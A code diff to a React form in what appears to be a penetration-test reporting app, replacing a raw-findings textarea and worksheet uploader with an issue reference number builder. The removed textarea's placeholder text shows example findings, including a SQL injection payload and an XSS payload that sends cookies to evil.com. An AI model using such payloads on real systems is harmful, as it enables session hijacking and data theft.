@@ -13,7 +13,6 @@ import {
   FileText,
   AlertTriangle,
   ArrowLeft,
-  ClipboardPaste,
   Brain,
   ImageIcon,
   Building2,
@@ -27,8 +26,6 @@ import { useToast } from "@/components/ui/toast";
 import { Select } from "@/components/FormElements/select";
 import InputGroup from "@/components/FormElements/InputGroup";
 import { AIAttachmentZone, type PoCImage } from "@/components/FormElements/ai-attachment-zone";
-import { WorksheetUploader } from "@/components/FormElements/worksheet-uploader";
-import type { ParsedWorksheet } from "@/lib/actions/worksheet-actions";
 import { MagicButton } from "@/components/ui/magic-button";
 import {
   AISkeleton,
@@ -136,12 +133,32 @@ export default function AIReportForm({ customers }: AIReportFormProps) {
   const [selectedStatus, setSelectedStatus] = useState("Draft");
 
   // AI Raw Input
-  const [rawFindings, setRawFindings] = useState("");
   const [aiContext, setAiContext] = useState("");
   const [pocImages, setPocImages] = useState<PoCImage[]>([]);
 
   // Scope
-  const [scopeData, setScopeData] = useState<ParsedWorksheet | null>(null);
+  const [scopeName, setScopeName] = useState("");
+
+  // Issue Reference Builder
+  const [clientCode, setClientCode] = useState("");
+  const [refSeverity, setRefSeverity] = useState("Info");
+  const [serviceAffected, setServiceAffected] = useState("");
+  const [findingSeq, setFindingSeq] = useState("");
+
+  const SEVERITY_LETTER: Record<string, string> = {
+    Critical: "C", High: "H", Medium: "M", Low: "L", Info: "I",
+  };
+
+  const issueReferenceNumber = useMemo(() => {
+    const cc = clientCode.toUpperCase().trim();
+    const sl = SEVERITY_LETTER[refSeverity] ?? "I";
+    const svc = serviceAffected.toUpperCase().trim();
+    const seq = findingSeq
+      ? String(parseInt(findingSeq, 10) || 0).padStart(3, "0")
+      : "001";
+    if (!cc && !svc) return "";
+    return `HTPT-${cc || "XX"}-${sl}-${svc || "SVC"}-${seq}`;
+  }, [clientCode, refSeverity, serviceAffected, findingSeq]);
 
   const customerOptions = customers.map((c) => ({
     value: c.id,
@@ -158,8 +175,7 @@ export default function AIReportForm({ customers }: AIReportFormProps) {
   }, [markdownReport]);
 
   /* ── Validation ── */
-  const isFormValid =
-    title.trim().length > 0 && rawFindings.trim().length > 0;
+  const isFormValid = title.trim().length > 0;
 
   /* ── Resolve customer name from selected ID ── */
   const selectedCustomerName =
@@ -178,16 +194,16 @@ export default function AIReportForm({ customers }: AIReportFormProps) {
       const result = await generateReportWithAI({
         title,
         customerName: selectedCustomerName,
-        rawNotes: rawFindings,
+        rawNotes: scopeName ? `Scope: ${scopeName}` : "",
         aiContext,
         pocImages: pocImages.map((img) => ({
           fileUrl: img.fileUrl,
           fileName: img.fileName,
           mimeType: img.mimeType,
         })),
-        scopeIssa1: scopeData?.issa1 ?? null,
-        scopeIssa2: scopeData?.issa2 ?? null,
-        scopeIssa3: scopeData?.issa3 ?? null,
+        scopeIssa1: null,
+        scopeIssa2: null,
+        scopeIssa3: null,
       });
 
       if (!result.success || !result.data) {
@@ -212,7 +228,7 @@ export default function AIReportForm({ customers }: AIReportFormProps) {
       setErrorShake(true);
       setTimeout(() => setErrorShake(false), 500);
     }
-  }, [isFormValid, title, selectedCustomerName, rawFindings, aiContext, pocImages, scopeData]);
+  }, [isFormValid, title, selectedCustomerName, scopeName, aiContext, pocImages]);
 
   /* ── Save Report handler ── */
   const handleSaveReport = useCallback(async () => {
@@ -231,24 +247,29 @@ export default function AIReportForm({ customers }: AIReportFormProps) {
           fileName: img.fileName,
           mimeType: img.mimeType,
         })),
-        scopeIssa1: scopeData?.issa1 ?? null,
-        scopeIssa2: scopeData?.issa2 ?? null,
-        scopeIssa3: scopeData?.issa3 ?? null,
+        scopeIssa1: null,
+        scopeIssa2: null,
+        scopeIssa3: null,
+        clientCode: clientCode.trim() || undefined,
+        serviceAffected: serviceAffected.trim() || undefined,
+        findingSequence: findingSeq ? parseInt(findingSeq, 10) || undefined : undefined,
+        issueReferenceNumber: issueReferenceNumber || undefined,
+        severity: refSeverity,
       });
 
       if (!result.success) {
-        throw new Error(result.error || "Failed to save report.");
+        throw new Error(result.error || "Failed to save finding.");
       }
 
-      addToast("Report saved successfully!", "success");
-      router.push(`/reports`);
+      addToast("Finding saved successfully!", "success");
+      router.push(`/findings`);
     } catch (err) {
       const msg = err instanceof Error ? err.message : "Save failed.";
       addToast(msg, "error");
     } finally {
       setSaving(false);
     }
-  }, [markdownReport, saving, title, reportId, selectedCustomerId, selectedStatus, pocImages, scopeData, addToast, router]);
+  }, [markdownReport, saving, title, reportId, selectedCustomerId, selectedStatus, pocImages, addToast, router, clientCode, serviceAffected, findingSeq, issueReferenceNumber, refSeverity]);
 
   /* ── Glass card helper ── */
   const glassCard = cn(
@@ -276,11 +297,10 @@ export default function AIReportForm({ customers }: AIReportFormProps) {
         </button>
         <div className="flex-1">
           <h2 className="text-lg font-semibold text-dark dark:text-white">
-            AI-Powered Report
+            New Finding with AI
           </h2>
           <p className="text-xs text-dark-5 dark:text-dark-6">
-            Paste your raw findings, attach PoC screenshots, and let AI draft
-            the full report
+            Attach PoC screenshots and let AI draft the finding report
           </p>
         </div>
         <div className="flex h-9 items-center gap-1.5 rounded-full bg-gradient-to-r from-purple-500/10 to-blue-500/10 px-4 text-xs font-medium text-purple-600 dark:from-purple-500/20 dark:to-blue-500/20 dark:text-purple-400">
@@ -356,25 +376,104 @@ export default function AIReportForm({ customers }: AIReportFormProps) {
               }
             />
 
-            {/* Scope (Worksheet Upload) */}
-            <div>
-              <label className="mb-1.5 block text-sm font-medium text-dark dark:text-white">
-                Scope
-              </label>
-              <p className="mb-3 text-xs text-dark-5 dark:text-dark-6">
-                Upload ISSA Worksheet (.xlsx) to auto-parse scope targets.
+            {/* Scope */}
+            <InputGroup
+              label="Scope"
+              name="scope"
+              type="text"
+              placeholder="e.g. Back Office Server (DC)"
+              value={scopeName}
+              handleChange={(e) => setScopeName(e.target.value)}
+            />
+          </div>
+
+          {/* ─── Issue Reference Builder ─── */}
+          <div className="mt-5 border-t border-stroke/50 pt-5 dark:border-dark-3/50">
+            <div className="flex items-center gap-2 mb-4">
+              <div className="flex h-7 w-7 items-center justify-center rounded-lg bg-purple-100 text-purple-600 dark:bg-purple-900/30 dark:text-purple-400">
+                <FileText size={14} />
+              </div>
+              <h4 className="text-sm font-semibold text-dark dark:text-white">
+                Issue Reference Builder
+              </h4>
+            </div>
+
+            <div className="mb-4 rounded-lg border-2 border-primary/30 bg-primary/5 p-3 text-center dark:bg-primary/10">
+              <p className="mb-0.5 text-[10px] font-medium uppercase tracking-wider text-dark-5 dark:text-dark-6">
+                Issue Reference Number
               </p>
-              <WorksheetUploader
-                initialData={null}
-                onChange={setScopeData}
-              />
+              <p className="font-mono text-lg font-bold tracking-wide text-primary">
+                {issueReferenceNumber || "HTPT-XX-I-SVC-001"}
+              </p>
+            </div>
+
+            <div className="grid grid-cols-2 gap-3">
+              <div>
+                <label className="mb-1.5 block text-xs font-medium text-dark dark:text-white">
+                  Client Code
+                </label>
+                <input
+                  type="text"
+                  maxLength={10}
+                  placeholder="e.g. TF"
+                  value={clientCode}
+                  onChange={(e) => setClientCode(e.target.value)}
+                  className="w-full rounded-lg border border-stroke bg-transparent px-3 py-2 text-xs uppercase text-dark outline-none transition focus:border-primary dark:border-dark-3 dark:text-white"
+                />
+              </div>
+
+              <div>
+                <label className="mb-1.5 block text-xs font-medium text-dark dark:text-white">
+                  Severity
+                </label>
+                <select
+                  value={refSeverity}
+                  onChange={(e) => setRefSeverity(e.target.value)}
+                  className="w-full rounded-lg border border-stroke bg-transparent px-3 py-2 text-xs text-dark outline-none transition focus:border-primary dark:border-dark-3 dark:bg-gray-dark dark:text-white"
+                >
+                  <option value="Critical">Critical (C)</option>
+                  <option value="High">High (H)</option>
+                  <option value="Medium">Medium (M)</option>
+                  <option value="Low">Low (L)</option>
+                  <option value="Info">Info (I)</option>
+                </select>
+              </div>
+
+              <div>
+                <label className="mb-1.5 block text-xs font-medium text-dark dark:text-white">
+                  Service Affected
+                </label>
+                <input
+                  type="text"
+                  maxLength={50}
+                  placeholder="e.g. SMB"
+                  value={serviceAffected}
+                  onChange={(e) => setServiceAffected(e.target.value)}
+                  className="w-full rounded-lg border border-stroke bg-transparent px-3 py-2 text-xs uppercase text-dark outline-none transition focus:border-primary dark:border-dark-3 dark:text-white"
+                />
+              </div>
+
+              <div>
+                <label className="mb-1.5 block text-xs font-medium text-dark dark:text-white">
+                  Finding Sequence
+                </label>
+                <input
+                  type="number"
+                  min={1}
+                  max={999}
+                  placeholder="e.g. 3"
+                  value={findingSeq}
+                  onChange={(e) => setFindingSeq(e.target.value)}
+                  className="w-full rounded-lg border border-stroke bg-transparent px-3 py-2 text-xs text-dark outline-none transition focus:border-primary dark:border-dark-3 dark:text-white"
+                />
+              </div>
             </div>
           </div>
         </motion.div>
 
-        {/* ─── Col 2: AI Raw Input Area (8 cols) ─── */}
+        {/* ─── Col 2: AI Input Area (8 cols) ─── */}
         <div className="space-y-5 xl:col-span-8">
-          {/* ── Raw Findings Notes ── */}
+          {/* ── AI Context / Strategic Instructions ── */}
           <motion.div
             custom={1}
             variants={cardVariants}
@@ -384,40 +483,6 @@ export default function AIReportForm({ customers }: AIReportFormProps) {
           >
             <AIWaveShimmer active={step === "generating"} />
 
-            <SectionHeader
-              icon={<ClipboardPaste size={16} />}
-              title="Raw Findings Notes"
-              badge="Required"
-            />
-
-            <p className="mt-1 text-xs text-dark-5 dark:text-dark-6">
-              Paste your unstructured pentest notes, tool outputs, Burp logs,
-              or any findings data. The AI will process and structure them.
-            </p>
-
-            <textarea
-              value={rawFindings}
-              onChange={(e) => setRawFindings(e.target.value)}
-              rows={10}
-              placeholder={`Example:\n\n[CRITICAL] SQL Injection in /api/v2/users?id=1' OR 1=1--\nParameter: id (GET)\nPayload: 1' UNION SELECT username,password FROM users--\nImpact: Full database dump, authentication bypass\n\n[HIGH] Stored XSS in user profile bio field\nEndpoint: POST /api/profile/update\nPayload: <script>document.location='https://evil.com/?c='+document.cookie</script>\nImpact: Session hijacking, account takeover\n\n[MEDIUM] IDOR on /api/documents/{id}\nAuthenticated user can access other users' documents by changing the id parameter.`}
-              className={cn(
-                "mt-3 w-full rounded-lg border border-stroke bg-transparent px-4 py-3 font-mono text-sm",
-                "text-dark placeholder:text-dark-5/60",
-                "dark:border-dark-3 dark:text-white dark:placeholder:text-dark-6/50",
-                "outline-none focus:border-primary transition-colors",
-                "resize-y",
-              )}
-            />
-          </motion.div>
-
-          {/* ── AI Context / Strategic Instructions ── */}
-          <motion.div
-            custom={2}
-            variants={cardVariants}
-            initial={prefersReduced ? false : "hidden"}
-            animate="visible"
-            className={cn(glassCard)}
-          >
             <SectionHeader
               icon={<Brain size={16} />}
               title="AI Context & Strategic Instructions"
@@ -447,7 +512,7 @@ export default function AIReportForm({ customers }: AIReportFormProps) {
 
           {/* ── PoC Attachments ── */}
           <motion.div
-            custom={3}
+            custom={2}
             variants={cardVariants}
             initial={prefersReduced ? false : "hidden"}
             animate="visible"
@@ -474,7 +539,7 @@ export default function AIReportForm({ customers }: AIReportFormProps) {
 
       {/* ─── Generate Button (full-width) ─── */}
       <motion.div
-        custom={4}
+        custom={3}
         variants={cardVariants}
         initial={prefersReduced ? false : "hidden"}
         animate="visible"
@@ -491,7 +556,7 @@ export default function AIReportForm({ customers }: AIReportFormProps) {
             <p className="text-xs text-dark-5 dark:text-dark-6">
               {isFormValid
                 ? "All required fields filled. Click to start AI generation."
-                : "Fill in Report Title and Raw Findings Notes to proceed."}
+                : "Fill in the Report Title to proceed."}
             </p>
           </div>
         </div>
